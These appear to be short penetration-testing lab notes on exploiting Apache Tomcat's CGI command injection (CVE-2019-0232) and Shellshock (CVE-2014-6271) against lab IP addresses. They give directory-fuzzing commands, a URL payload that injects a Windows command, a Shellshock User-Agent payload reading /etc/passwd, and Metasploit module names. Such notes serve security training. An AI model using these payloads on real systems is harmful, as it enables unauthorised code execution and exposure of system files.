### Known CVEs
**CVE-2019-0232**
(for versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 )

How to attack:
1)First find the running version of Tomcat via NMAP or Rustscan
2)Scout for CGI folders (Usually is either /cgi or /cgi-bin):
`ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ`
`or`
`ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd`
(for Windows istances can be either .cmd or .bat )

3)When you find it now you can attack by using ?&COMMAND it will interpreter as a RCE: `http://10.129.204.227:8080/cgi/welcome.cmd?&dir`
(OBS: You may need to URL encode the payload after &)
OR 
use the MSF module: `exploit/windows/http/tomcat_cgi_cmdlineargs`


### ShellShock
https://nvd.nist.gov/vuln/detail/CVE-2014-6271
(Targeting /cgi-bin)

How to Attack
1)Find the .cgi
`gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi`

2)Check Vulneraility (We will try to LFI)
`curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi`

3)Exploit:
`exploit/multi/http/apache_mod_cgi_bash_env_exec`
